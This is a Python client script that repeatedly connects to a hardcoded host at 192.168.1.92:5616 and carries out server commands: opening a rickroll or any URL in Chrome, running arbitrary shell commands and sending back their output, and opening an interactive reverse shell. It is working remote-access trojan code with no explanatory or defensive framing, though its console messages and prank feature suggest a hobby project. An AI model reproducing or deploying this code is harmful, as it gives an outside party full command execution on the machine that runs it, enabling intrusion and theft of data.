import subprocess
import threading
import time
import webbrowser
import socket

from colorama import Fore, Style

# HOST = '127.0.0.1'
HOST = "192.168.1.92"
PORT = 5616

rickroll_URL = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
chrome_path = 'C:\Program Files\Google\Chrome\Application\chrome.exe'


def main():
    # rickroll()
    socketStart()


def open_chrome(url):
    subprocess.call([chrome_path, url])


def socketStart():
    while True:  # search for server
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                try:
                    s.connect((HOST, PORT))
                    print("Connected to server.")
                except ConnectionRefusedError:
                    print("Connection refused by server.")
                    time.sleep(1)
                    continue
                # listen for requests
                while True:  # while connected to server
                    data = s.recv(1024).decode('utf-8')
                    if not data:
                        break
                    elif data == 'KILL':
                        print("Server sent KILL command. Exiting...")
                        exit(0)
                    elif data == 'ROLL':
                        open_chrome(rickroll_URL)
                        print("Server sent rickroll.")
                    elif str(data).startswith("CHROME"):
                        print("Opening Chrome tab: " + data.split(' ')[1])
                        open_chrome(data.split(' ')[1])
                    elif data == 'RSHELL':
                        print("Opening Reverse Shell...")
                        rshell(s)
                        print("Reverse Shell closed.")
                    elif str(data).startswith("EXEC"):
                        print("Executing command: " + data.split(' ')[1])
                        output = subprocess.Popen(data.split(' ')[1], shell=True, stdout=subprocess.PIPE,
                                                  stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                        results = output.stdout.read().decode('utf-8')
                        errors = output.stderr.read().decode('utf-8')
                        print(Fore.BLUE + "Execution Results: " + Style.RESET_ALL + "{}".format((results if results else errors).strip()))
                        send_shell_results(s, results if results else errors)
                    else:
                        print("Received data: {}".format(data))
        except socket.error as e:  # if server connection fails
            print("Connection error: {}".format(e))


def rshell(s):
    while True:
        command = s.recv(1024).decode('utf-8').rstrip('\n')
        print(Fore.GREEN + "RShell remote command: {}".format(command) + Style.RESET_ALL)
        if command.lower() == 'exit':
            break
        output = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                  stdin=subprocess.PIPE)
        results = output.stdout.read().decode('utf-8')
        errors = output.stderr.read().decode('utf-8')
        if not results and not errors:
            results = "NONE"
        print(Fore.BLUE + "RShell results: " + Style.RESET_ALL + "{}".format(results if results else errors)) # includes newline

        send_shell_results(s, results if results else errors)


def send_shell_results(s, results):
    try:
        data_to_send = results.encode("utf-8")
        # Send data in chunks
        for i in range(0, len(data_to_send), 1024):
            s.sendall(data_to_send[i:i + 1024]) # Send 1024 bytes at a time
        print("Sent results.")
    except BrokenPipeError:
        print("Connection closed by server.")
        return


if __name__ == "__main__":
    main()
